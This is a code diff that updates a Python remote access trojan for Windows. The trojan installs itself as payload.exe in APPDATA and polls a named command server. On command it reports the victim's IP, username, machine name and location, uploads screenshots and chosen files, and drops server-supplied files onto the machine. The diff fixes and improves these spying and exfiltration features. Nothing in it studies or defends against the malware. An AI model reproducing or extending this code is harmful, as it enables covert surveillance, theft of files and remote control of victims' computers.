@@ -1,5 +1,5 @@
 import requests, _winreg, os
-from time import strftime, gmtime, sleep
+from time import strftime, localtime, sleep
 from base64 import b64encode
 from shutil import copyfile
 from json import loads
@@ -10,7 +10,7 @@ from mss import mss
 server_address = 'http://cyberazor.altervista.org/PythonRAT/api.php'
 file_name = 'payload.exe'
 path = os.getenv('appdata')
-file_path = path + filename
+file_path = os.path.join(path, file_name)
 application_path = argv[0]
 
 # HTTP GET request
@@ -76,14 +76,13 @@ while True:
 		# detailed status, response: if online -> public IP, username, computer name, system time, location
 		if command[0] == 'status':
 			# get public IP and location using ipinfo API
-			ip = ''.join(get_req('http://ipinfo.io/ip').text.split('\n'))
-			geo = loads(get_req('http://ipinfo.io/' + ip + '/geo'))
+			geo = loads(get_req('http://ip-api.com/json').text)
 			status = {
-				'ip' : ip,
+				'ip' : geo['query'],
 				'username' : os.getenv('username'),
 				'computername' : os.getenv('computername'),
-				'time' : strftime("%Y-%m-%d %H:%M:%S", gmtime()),
-				'location' : geo['city'] + ', ' + geo['region'] + ', ' + geo['country']
+				'time' : strftime("%Y-%m-%d %H:%M:%S", localtime()),
+				'location' : geo['city'] + ', ' + geo['regionName'] + ', ' + geo['country']
 			}
 			post_req(server_resp, status)
 		
@@ -95,27 +94,27 @@ while True:
 		elif command[0] == 'screenshot':
 			mss().shot(mon = -1, output = 'scr.png')
 			with open('scr.png', 'rb') as scr_file:
-				post_file(server_resp, {'response' : 'scr.png', 'time' : strftime("%Y-%m-%d %H:%M:%S", gmtime())}, scr_file)
+				post_file(server_resp, {'response' : 'scr.png', 'time' : strftime("%Y-%m-%d %H:%M:%S", localtime())}, scr_file)
 			os.remove('scr.png')
 		
 		# get a file from target, response: requested file
 		elif command[0] == 'getfile':
 			filepath_get = ' '.join(command[1].split('[SPACE]'))
 			if os.path.isfile(filepath_get):
-				filename_get = filepath_get.split('\\')[-1]
+				filename_get = filepath_get.split('\\')[-1].split('/')[-1]
 				with open(filepath_get, 'rb') as fileget:
 					post_file(server_resp, {'response' : filename_get}, fileget)
 			else:
 				post_req(server_resp, {'response' : 'Error: file not found'})
 		
-		# sendfile command, detected by content-type header, response: file transfer status
-		elif com.headers['Content-Type'] == 'application/force-download':
-			# getting filename through another GET request to server
-			filename = get_req(server_address + '?getfilename=1').text
-			filename = ' '.join(filename.split('[SPACE]'))
-			total_length = int(com.headers['Content-Length'])
+		# send a file to target, response: download status
+		elif command[0] == 'sendfile':
+			filename = command[1][1]
+			# download file from server
+			dl = get_req(server_address + '?sendfile=1')
+			total_length = int(dl.headers['Content-Length'])
 			with open(filename, 'wb') as file_save:
-				for chunk in com.iter_content(chunk_size = 4096):
+				for chunk in dl.iter_content(chunk_size = 4096):
 					if chunk:
 						file_save.write(chunk)
 			# if filesize matches with content-length header, download successful
